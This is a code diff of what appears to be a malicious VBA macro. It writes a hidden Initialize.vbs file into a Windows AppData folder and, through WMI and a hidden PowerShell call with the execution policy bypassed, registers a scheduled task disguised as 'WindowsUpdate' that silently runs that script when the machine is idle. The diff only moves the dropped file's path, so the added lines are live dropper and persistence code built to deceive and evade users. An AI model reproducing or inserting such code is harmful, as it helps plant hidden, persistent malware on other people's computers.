@@ -30,10 +30,10 @@ End Sub
     
     
     FileNum = FreeFile
-    Open "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\Initialize.vbs" For Binary Access Write As #FileNum
+    Open "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Initialize.vbs" For Binary Access Write As #FileNum
     Put #FileNum, 1, FileData
     Close #FileNum
-SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\Initialize.vbs", vbHidden
+SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Initialize.vbs", vbHidden
             
     End Function
      
@@ -46,7 +46,7 @@ SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\Initialize.v
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN WindowsUpdate /TR 'C:\Windows\System32\WScript.exe //Nologo //B C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\Initialize.vbs' /SC onidle /i 20}", Null, objConfig, intProcessID
+        objProcess.Create "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN WindowsUpdate /TR 'C:\Windows\System32\WScript.exe //Nologo //B C:\Users\Default\AppData\Roaming\Microsoft\Windows\Initialize.vbs' /SC onidle /i 20}", Null, objConfig, intProcessID
      End Function
      
 
